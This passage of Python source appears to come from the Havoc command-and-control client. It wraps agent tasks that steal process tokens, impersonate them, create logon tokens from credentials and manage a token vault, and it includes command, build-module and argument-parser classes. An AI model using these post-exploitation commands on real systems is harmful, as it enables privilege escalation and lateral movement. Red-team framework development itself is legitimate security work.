            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return True, ctx[ 'task-uuid' ]

    def token_impersonate(
        self,
        token_handle: int,
        wait_to_finish: bool = True
    ) -> tuple[str, int]:
        """
        impersonate given token

        :param token_handle:
            token to impersonate

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (uid, task-uuid)

            uid:
                username of the impersonated token

            task-uuid:
                uuid of task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control":      "impersonate",
                "token-handle": token_handle
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'return' ], ctx[ 'task-uuid' ]

    def token_steal(
        self,
        process_id    : int,
        impersonate   : bool = True,
        vault_save    : bool = True,
        wait_to_finish: bool = True
    ) -> tuple[int, str, int]:
        """
        process token stealing function

        :param process_id:
            process id to steal token from

        :param impersonate
            if the stolen token should be impersonated

        :param vault_save:
            if the stolen token should be saved to the vault (default: true)

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (token-handle, uid, task-uuid)

            token-handle:
                process token handle that has been
                stolen from the specified token

            uid:
                the uid string (utf-16le) that has been
                retrieved from the stolen token

            task-uuid:
                uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"    : "steal",
                "pid"        : process_id,
                "impersonate": impersonate,
                "vault-save" : vault_save
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        task = ctx[ 'task-uuid' ]
        ctx  = ctx[ 'return' ]

        return ctx[ 'handle' ], ctx[ 'uid' ], task

    def token_make(
        self,
        domain        : str,
        username      : str,
        password      : str,
        local_token   : bool = True,
        impersonate   : bool = True,
        vault_save    : bool = True,
        wait_to_finish: bool = True
    ) -> tuple[int, str, int]:
        """
        generate token from valid credentials

        :param domain:
            logon domain name

        :param username:
            logon username

        :param password:
            logon password

        :param local_token:
            if local token should be generated to access other users directories

        :param vault_save:
            save token to vault (default: true)

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (token-handle, uid, task-uuid)

            token-handle:
                process token handle that has been
                stolen from the specified token

            uid:
                the uid string (utf-16le) that has been
                retrieved from the stolen token.

                Tho it won't be in the name of the newly
                generated user token rather it is going
                to be applied to the current token (when impersonated).

            task-uuid:
                uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"     : "make",
                "domain"      : domain,
                "username"    : username,
                "password"    : password,
                "local-token" : local_token,
                "impersonate" : impersonate,
                "vault-save"  : vault_save
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        task = ctx[ 'task-uuid' ]
        ctx  = ctx[ 'return' ]

        return ctx[ 'handle' ], ctx[ 'uid' ], task

    def token_vault_list(
        self,
        wait_to_finish: bool = True
    ) -> tuple[int, list[dict], int]:
        """
        get all captured and saved tokens inside the vault

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (current-token, tokens, task-uuid)

            current-token:
                is the current impersonated token from the vault

            tokens:
                captured and saved tokens inside the vault

            task-uuid:
                uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control" : "vault-list",
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'current-token' ], ctx[ 'return' ], ctx[ 'task-uuid' ]

    def token_vault_clear(
        self,
        wait_to_finish: bool = True
    ) -> int:
        """
        clear all captured and saved tokens inside the vault

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control" : "vault-clear",
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'task-uuid' ]

    def token_vault_remove(
        self,
        token_handle  : int,
        wait_to_finish: bool = True
    ) -> int:
        """
        clear all captured and saved tokens inside the vault

        :param token_handle
            token handle to remove

        :param wait_to_finish:

            should wait for returned data (default: true)

        :return:
            uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"     : "vault-remove",
                "token-handle": token_handle
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'task-uuid' ]

@pyhavoc.agent.HcAgentExport
class HcKaineBuildModule:

    def __init_subclass__( cls, **kwargs ):
        protocol = "" # no protocol by default
        priority = 2  # default priority

        ##
        ## if protocol is set then insert it
        ##
        if 'protocol' in kwargs:
            protocol = kwargs[ 'protocol' ]
            priority = 1                    # communication modules have a slightly higher priority
        setattr( cls, "protocol", lambda self: protocol )

        ##
        ## if priority is set then insert it
        ##
        if 'priority' in kwargs:
            priority = kwargs[ 'priority' ]
        setattr( cls, "priority", lambda self: priority )

        ##
        ## raise exception if priority is higher than 2
        ##
        if priority > 2:
            raise RuntimeError( "priority cannot be higher than 2" )

        KAINE_MODULES[ priority ].append( cls )

    def __init__( self ):
        return

    def interface( self, layout: QVBoxLayout ):
        pass

    def configuration( self, config: dict ) -> bytes:
        return b''

    def module( self ) -> bytes:
        return b''

@pyhavoc.agent.HcAgentExport
class HcKaineCommand:

    def __init_subclass__( cls, **kwargs ):
        KAINE_COMMANDS.append( cls )

    def __init__( self, agent: HcKaine ):

        self.__agent     = agent
        self.command     = ""
        self.description = ""
        self.is_module   = False
        self.opsec_safe  = True
        self.self_side   = False
        self.parser      = None
        self.min_args    = 0

        return

    def agent( self ) -> HcKaine:
        return self.__agent

    def arguments(
        self
    ):
        pass

    def _args_handle(
        self,
        args: list[ str ]
    ):
        parser_args = None
        self.parser = KnArgumentParser( prog=self.command, description=self.description, exit_on_error=False )

        self.arguments()

        try:
            parser_args = self.parser.parse_args( args[ 1: ] )
        except KnArgumentUsageError as err:
            self.agent().console_input( ' '.join( args ), local_only=True )

            prog, message, usage = err.args
            self.agent().console_print( f"{prog}: {message}" )
            self.agent().console_print( usage )
            return

        except KnArgumentExit as err:
            self.agent().console_input( ' '.join( args ), local_only=True )

            help, status = err.args
            self.agent().console_print( help )
            return

        except argparse.ArgumentError as err:
            self.agent().console_input( ' '.join( args ), local_only=True )
            self.agent().console_print( f"{err}" )

        return parser_args

    def log_info( self, text ):
        self.agent().console_log( text )

    def log_error( self, text ):
        self.agent().console_log( type='error', text=text )

    def log_warning( self, text ):
        self.agent().console_log( type='warning', text=text )

    def log_good( self, text ):
        self.agent().console_log( type='success', text=text )

    def log_debug( self, text ):
        self.agent().console_log( type='debug', text=text )

    def log_raw( self, text ):
        self.agent().console_log( type='raw', text=text )

    def execute(
        self,
        args
    ):
        pass

@pyhavoc.agent.HcAgentExport
class KnArgumentExit(BaseException):
    pass

@pyhavoc.agent.HcAgentExport
class KnArgumentError(BaseException):
    pass

@pyhavoc.agent.HcAgentExport
class KnArgumentUsageError(BaseException):
    pass

@pyhavoc.agent.HcAgentExport
class KnArgumentParser( argparse.ArgumentParser ):

    def __init__( self, *args, **kwargs ):
        if 'formatter_class' not in kwargs:
            kwargs['formatter_class'] = argparse.RawDescriptionHelpFormatter

        kwargs['exit_on_error'] = False

        super().__init__( *args, **kwargs )

    def exit( self, status=0, message=None ):
        raise KnArgumentExit( message, status )

    def error(self, message):
        raise KnArgumentUsageError( self.prog, message, self.format_usage() )

    def print_help( self, file = None ):
        raise KnArgumentExit( self.format_help(), 0 )